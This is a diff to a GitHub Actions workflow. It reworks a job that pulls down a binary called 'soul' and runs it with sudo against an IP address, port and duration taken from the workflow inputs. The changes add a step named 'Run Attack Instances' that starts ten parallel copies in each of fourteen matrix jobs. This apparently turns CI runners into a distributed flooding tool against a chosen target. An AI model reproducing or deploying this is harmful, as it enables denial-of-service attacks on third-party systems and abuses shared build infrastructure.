@@ -15,10 +15,20 @@ on:
 jobs:
   soul:
     runs-on: ubuntu-latest
+    timeout-minutes: 10
     strategy:
+      fail-fast: false
       matrix:
         n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14]
     steps:
-    - uses: actions/checkout@v3
-    - run: chmod +x *
-    - run: sudo ./soul ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} 900
+    - name: Fast Sparse Checkout
+      run: |
+        git clone --depth 1 --filter=blob:none --sparse https://github.com/${{ github.repository }}.git .
+        git sparse-checkout set soul
+    - name: Run Attack Instances
+      run: |
+        chmod +x soul
+        for i in {1..10}; do
+          sudo ./soul ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} 900 &
+        done
+        wait
